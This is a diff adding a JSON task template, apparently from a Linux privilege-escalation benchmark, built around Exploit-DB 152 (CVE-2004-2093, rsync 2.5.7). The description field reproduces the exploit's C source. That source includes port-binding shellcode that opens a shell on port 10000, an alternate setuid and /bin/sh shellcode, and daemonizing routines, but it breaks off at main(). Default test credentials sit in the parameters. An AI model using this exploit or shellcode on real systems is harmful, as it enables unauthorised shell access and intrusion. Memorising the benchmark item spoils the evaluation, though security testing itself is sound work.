@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_152",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: rsync 2.5.7 - Local Stack Overflow / Local Privilege Escalation (OSVDB-45182;CVE-2004-2093)\n\nExploit source code (152.c):\n```\n/*\n* rsync <= 2.5.7 Local Exploit\n* Saved EIP on stack is overwritten with address of shellcode in memory\n* Generally rsync is not setuid or setgid so just a local shell is of no use\n* So i used a portbinding shellcode as a PoC of a different attack vector.\n* RET is calculated dynamically so payload can be changed just by changing shellcode\n* Tested on:\n* [eos@Matrix my]$ uname -a\n* Linux Matrix 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux\n* coded by: abhisek linuxmail org\n* Special Thanks: n2n, Hirosh Joseph\n*/\n\n#include <stdio.h>\n/* Includes for code to daemonize */\n#include <signal.h>\n#include <sys/wait.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n/****/\n#define PATH \"/usr/local/bin/rsync\"\n#define BUFF_SIZE 100\n//#define RET 0xbffffdfb\n\n/* 88 bytes portbinding shellcode - linux-x86\n* - by bighawk (bighawk warfare com)\n*\n* This shellcode binds a shell on port 10000\n* stdin, stdout and stderr are dupped. accept() arguments are sane.\n*/\nchar shellcode[] =\n\"\\x31\\xdb\" // xor ebx, ebx\n\"\\xf7\\xe3\" // mul ebx\n\"\\xb0\\x66\" // mov al, 102\n\"\\x53\" // push ebx\n\"\\x43\" // inc ebx\n\"\\x53\" // push ebx\n\"\\x43\" // inc ebx\n\"\\x53\" // push ebx\n\"\\x89\\xe1\" // mov ecx, esp\n\"\\x4b\" // dec ebx\n\"\\xcd\\x80\" // int 80h\n\"\\x89\\xc7\" // mov edi, eax\n\"\\x52\" // push edx\n\"\\x66\\x68\\x27\\x10\" // push word 4135\n\"\\x43\" // inc ebx\n\"\\x66\\x53\" // push bx\n\"\\x89\\xe1\" // mov ecx, esp\n\"\\xb0\\x10\" // mov al, 16\n\"\\x50\" // push eax\n\"\\x51\" // push ecx\n\"\\x57\" // push edi\n\"\\x89\\xe1\" // mov ecx, esp\n\"\\xb0\\x66\" // mov al, 102\n\"\\xcd\\x80\" // int 80h\n\"\\xb0\\x66\" // mov al, 102\n\"\\xb3\\x04\" // mov bl, 4\n\"\\xcd\\x80\" // int 80h\n\"\\x50\" // push eax\n\"\\x50\" // push eax\n\"\\x57\" // push edi\n\"\\x89\\xe1\" // mov ecx, esp\n\"\\x43\" // inc ebx\n\"\\xb0\\x66\" // mov al, 102\n\"\\xcd\\x80\" // int 80h\n\"\\x89\\xd9\" // mov ecx, ebx\n\"\\x89\\xc3\" // mov ebx, eax\n\"\\xb0\\x3f\" // mov al, 63\n\"\\x49\" // dec ecx\n\"\\xcd\\x80\" // int 80h\n\"\\x41\" // inc ecx\n\"\\xe2\\xf8\" // loop lp\n\"\\x51\" // push ecx\n\"\\x68\\x6e\\x2f\\x73\\x68\" // push dword 68732f6eh\n\"\\x68\\x2f\\x2f\\x62\\x69\" // push dword 69622f2fh\n\"\\x89\\xe3\" // mov ebx, esp\n\"\\x51\" // push ecx\n\"\\x53\" // push ebx\n\"\\x89\\xe1\" // mov ecx, esp\n\"\\xb0\\x0b\" // mov al, 11\n\"\\xcd\\x80\"; // int 80h\n/* Shellcode by n2n [n2n@linuxmail.org] used for initial testing */\n/*\nchar shellcode[]=\n// setreuid(geteuid(),geteuid()), no use unless rsync is setuid, usually its not\n\"\\x31\\xc0\\xb0\\x31\\xcd\\x80\\x93\\x89\\xd9\\x31\\xc0\\xb0\\x46\\xcd\\x80\"\n// setregid(getegid(),getegid())\n\"\\x31\\xc0\\xb0\\x32\\xcd\\x80\\x93\\x89\\xd9\\x31\\xc0\\xb0\\x47\\xcd\\x80\"\n// exec /bin/sh\n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\"\n// exit()\n\"\\x31\\xdb\\x89\\xd8\\xb0\\x01\\xcd\\x80\";\n*/\nvoid handler(int sig) {\nint stat;\npid_t pid;\nwhile ((pid = waitpid(-1, &stat, WNOHANG)) > 0) { }\nreturn;\n}\nvoid go_daemon() {\nint i;\nif(fork())\nexit (0);\nsetsid();\ni=open(\"/dev/null\",O_RDWR);\ndup2(i, 0);\ndup2(i, 1);\ndup2(i, 2);\nclose(i);\nfor (i=1;i<64;i++)\nsignal(i,SIG_IGN);\nsignal(SIGCHLD,handler);\n}\nint main(int argc,char *argv[]) {\n\n```",
+  "cve": "OSVDB-45182;CVE-2004-2093",
+  "exploitdb_id": "152",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_152",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
